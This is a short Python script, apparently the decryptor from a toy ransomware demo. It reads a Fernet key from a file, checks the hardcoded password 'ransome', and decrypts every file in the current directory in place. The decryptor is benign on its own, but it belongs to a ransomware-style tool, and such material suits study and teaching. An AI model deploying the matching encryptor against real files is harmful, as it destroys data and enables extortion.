#!/usr/bin/env python3
# Import libraries

import os
from cryptography.fernet import Fernet
print("... libraries imported")


# Collect list of files

def get_file_list():
	files = []
	for file in os.listdir():
		if file == "encrypt.py" or file == "decrypt.py" or file == "key_file.key":
			continue
		if os.path.isfile(file):
			files.append(file)

	print("Found files are:", files)
	return files


# Get Key

def get_key():
	with open("key_file.key", "rb") as f:
		key = f.read()
	print("...key found")
	return key


# Decrypt

def decryption_process(files, key):
    password = input("Enter the password to decrypt the files:")
    if password == "ransome":
        print("Decryption started...")
        for file in files:
            with open(file, "rb") as f:
                content = f.read()
            decrypted_content = Fernet(key).decrypt(content)
            with open(file, "wb") as f:
                f.write(decrypted_content)
                
        print("...decryption complete")


# Main function calls

files = get_file_list()
key = get_key()
decryption_process(files, key)
